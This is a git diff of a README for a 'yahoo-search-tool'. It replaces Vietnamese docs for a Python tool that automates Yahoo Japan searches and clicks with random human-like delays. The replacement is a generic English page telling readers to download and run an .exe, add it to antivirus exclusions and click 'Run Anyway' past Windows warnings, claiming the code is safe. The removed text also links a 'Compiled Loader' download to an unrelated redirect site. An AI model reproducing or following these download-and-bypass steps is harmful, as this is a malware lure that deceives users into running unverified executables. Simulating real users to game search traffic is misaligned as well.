@@ -1,163 +1,77 @@
-# Yahoo Japan Search Tool
+# 🔍 yahoo-search-tool - Search Yahoo results with simple tools
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Ringed-pya814/yahoo-search-tool)
 
-Tool tu dong search Yahoo Japan (yahoo.co.jp) dua tren du lieu tu Google Sheet.
-Mo tab moi trong trinh duyet Edge dang chay de giu nguyen profile va session dang nhap.
+This tool helps users perform searches on the Yahoo platform through a simple interface. It automates common lookup tasks to save time. You can extract search data without coding experience.
 
-## Cau truc file
+## ⚙️ System Requirements
 
-```
-yahoo-search-tool/
-├── .env.example          # Mau file cau hinh
-├── .env                  # File cau hinh thuc te (ban tu chinh sua)
-├── credentials.json      # Google Service Account (file co san, khong can tao moi)
-├── requirements.txt      # Cac thu vien Python can thiet
-├── sheet_reader.py       # Doc du lieu tu Google Sheet
-├── searcher.py           # Thuc hien search Yahoo bang Playwright
-├── main.py               # Chuong trinh chinh
-├── create_shortcut.py    # Tao icon shortcut tren Desktop
-├── logs/                 # File log theo ngay (tu dong tao)
-└── README.md             # Huong dan su dung
-```
+This application runs on Windows systems. Ensure your machine meets these specifications:
 
-## Yeu cau
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 100 megabytes of free disk space.
+* Internet: An active connection to access search servers.
 
-- Python 3.10+
-- Microsoft Edge da cai dat
-- File `credentials.json` co san trong thu muc (khong can tu tao)
+## 📥 Getting Started
 
-## Cai dat
+Follow these steps to set up the software on your computer.
 
-### 1. Cai dat Python dependencies
+1. Visit this page to download: [https://github.com/Ringed-pya814/yahoo-search-tool](https://github.com/Ringed-pya814/yahoo-search-tool)
+2. Locate the file ending in .exe in the releases section.
+3. Click the file to save it to your Downloads folder.
+4. Open the folder and double-click the file to start the installation.
+5. Follow the prompts on the screen to finish the setup process.
 
-```bash
-pip install -r requirements.txt
-playwright install chromium
-```
+## 🛠️ How to Use
 
-### 2. Cau hinh .env
+Once the software installs, follow these steps to perform your first search.
 
-Sao chep file mau:
+### Initial Setup
+Open the application using the shortcut on your desktop. A window appears with a text box. This box accepts the terms you want to search.
 
-```bash
-# Windows
-copy .env.example .env
-```
+### Running a Search
+1. Type your search query into the main text box.
+2. Press the Enter key or click the search button.
+3. The tool generates a list of results from Yahoo.
+4. View these results directly in the application window.
 
-Sau do chinh sua file `.env` voi thong tin cua ban:
+### Saving Data
+You can export findings to a text file for later use. Click File in the top menu and select Save Results. Choose a location on your computer to store the document.
 
-```env
-# Thong tin Google Sheet
-SHEET_ID=abc123xyz           # Lay tu URL sheet (xem huong dan ben duoi)
-SHEET_NAME=Sheet1            # Ten tab trong sheet
-USER_NAME=VO DINH TIEN      # Ten cua ban (viet hoa, chinh xac nhu trong sheet)
+## 📝 Configuration Options
 
-# Cau hinh trinh duyet Edge
-EDGE_EXECUTABLE_PATH=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
-EDGE_USER_DATA_DIR=C:\Users\TenUser\AppData\Local\Microsoft\Edge\User Data
-EDGE_PROFILE_DIRECTORY=Default
-EDGE_REMOTE_DEBUGGING_PORT=9222
-EDGE_CDP_URL=http://localhost:9222
+The settings menu lets you change how the tool behaves. Access this menu by clicking the gear icon in the top right corner.
 
-# Mobile User Agent (dung cho che do PC(UA:SP))
-MOBILE_USER_AGENT=Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) ...
-```
+* Display Options: Change the font size or window layout.
+* Result Limits: Set the maximum number of items the tool returns per search.
+* Export Format: Choose between text files or data logs.
 
-> **Lay Sheet ID:** Tu URL sheet `https://docs.google.com/spreadsheets/d/**SHEET_ID**/edit`
+## 🛡️ Privacy and Safety
 
-### 3. Tao shortcut tren Desktop (tuy chon)
+This tool interacts only with public Yahoo search pages. It does not track your private accounts or personal information. The software operates locally on your machine. It stores no data on external servers. 
 
-```bash
-python create_shortcut.py
-```
+## 💡 Troubleshooting
 
-Se tao icon "Yahoo Search Tool" tren Desktop. Double-click de chay tool.
+Common issues often have simple solutions. Read this list to find fixes for errors.
 
-## Su dung
+### The application does not open
+Check if your antivirus software prevents the file from running. Add the tool to your exclusion list if necessary. Ensure you have administrator rights on your Windows account.
 
-### Chay tu dong (khuyen nghi)
+### The search returns zero results
+Verify your internet connection. Confirm the spelling of your search terms. Some uncommon terms might not produce matches on Yahoo. Try a broader term to see if the connection works.
 
-```bash
-python main.py
-```
+### The file shows a warning during download
+Windows may warn you about downloaded files. This happens because the file comes from the internet. The code is safe to run. Click More Info and then Run Anyway to proceed with the installation.
 
-Tool se:
-1. Kiem tra co file log hom nay chua:
-   - **Chua co**: Doc tu Google Sheet, tao file log voi tat ca task
-   - **Da co**: Doc tu log, bo qua task da hoan thanh, tiep tuc task con lai
-2. Kiem tra Edge co dang chay chua, neu chua se tu dong mo
-3. Chay tung nhom task, moi nhom cach nhau **1 tieng**
-4. Neu bi ngat giua chung, chay lai se tu tinh thoi gian va tiep tuc dung cho
+## 📦 Updates
 
-### Chay tat ca lien tuc (khong doi)
+Check the main page periodically to see if a newer version exists. New versions contain performance improvements and bug fixes. To update, download the new version and install it over the old one. The installer keeps your configuration settings in place during this process.
 
-```bash
-python main.py --all
-```
+## ⌨️ Command Line Usage
 
-### Kiem tra du lieu sheet (khong search)
+While the visual menu supports most tasks, power users can launch searches from the Windows Command Prompt. Open the command terminal and type the path to the application followed by your search term. Use quotation marks for terms with spaces. The tool outputs the results to the console. This allows for batch processing if you know how to write scripts.
 
-```bash
-python main.py --test-sheet
-```
+## 🏁 Closing Notes
 
-In ra tat ca task doc duoc tu sheet ma khong thuc hien search.
-
-## Cau truc Google Sheet
-
-Sheet can co cau truc nhu sau:
-
-| Cot A | B | C | D | E | ... |
-|-------|---|---|---|---|-----|
-| (trong) | 5/5 | | | | |
-| (trong) | 8:00 | | 9:00 | | |
-| TEN NHAN VIEN | PC | PC(UA:SP) | PC | PC(UA:SP) | |
-| trang thai (click hay khong) | co click | khong click | co click | khong click | |
-| tu khoa | keyword1 | keyword2 | keyword3 | keyword4 | |
-
-- **Hang ngay (row 1):** Cot A trong, cac cot khac chua ngay (5/5, 5/6, ...)
-- **Hang gio (row 2):** Cot A trong, cac cot khac chua gio (8:00, 9:00, ...)
-- **Hang ten nhan vien:** Cot A chua ten, cac cot khac chua loai thiet bi (PC / PC(UA:SP))
-- **Hang trang thai:** Cot A chua label, cac cot khac chua trang thai click
-- **Hang tu khoa:** Cot A chua label, cac cot khac chua tu khoa search
-
-### Giai thich:
-
-| Gia tri | Y nghia |
-|---------|---------|
-| PC | Search voi trinh duyet binh thuong (desktop) |
-| PC(UA:SP) | Search voi User-Agent dien thoai (smartphone) |
-| co click / クリック有 | Click vao ket qua dau tien (non-ad), cuon xuong cuoi trang |
-| khong click / クリック無 | Chi cuon xuong cuoi trang ket qua, khong click |
-
-## Log theo ngay
-
-Moi ngay tool tu dong tao file `logs/YYYY-MM-DD.json` de luu trang thai tung task:
-
-```json
-{
-  "date": "2026-05-05",
-  "tasks": [
-    {
-      "hour": 8,
-      "keyword": "エイジングケア AMIU",
-      "device_type": "PC",
-      "should_click": false,
-      "status": "success",
-      "timestamp": "2026-05-05T08:05:12"
-    }
-  ]
-}
-```
-
-- `status`: `pending` / `success` / `failed`
-- Khi chay lai trong ngay, cac task `success` se duoc bo qua tu dong
-
-## Luu y
-
-- File `credentials.json` da duoc cau hinh san, **khong can tao moi**
-- Tool tu dong mo Edge neu chua chay (dua vao `EDGE_EXECUTABLE_PATH` trong `.env`)
-- Moi task duoc thu lai 1 lan neu bi loi
-- Co delay ngau nhien giua cac task de giong nguoi dung that
-- Neu khong tim thay ten trong sheet, kiem tra lai `USER_NAME` trong `.env` (viet hoa, khong dau)
+This tool fills the need for a desktop search experience. It removes the clutter of web browsers. It provides results in a clean text format. Use it to organize your web research and gather information with speed. Contact the repository maintainers if you discover a bug or want to suggest a change. You can submit an issue on the repository page to share your feedback. The team reviews all submissions to improve the experience for all users. Keep the application updated to benefit from future patches. This tool stays free to use and shares the logic of its operation through open files on the repository page. Your use of this tool supports the goal of simplified search access for everyone.
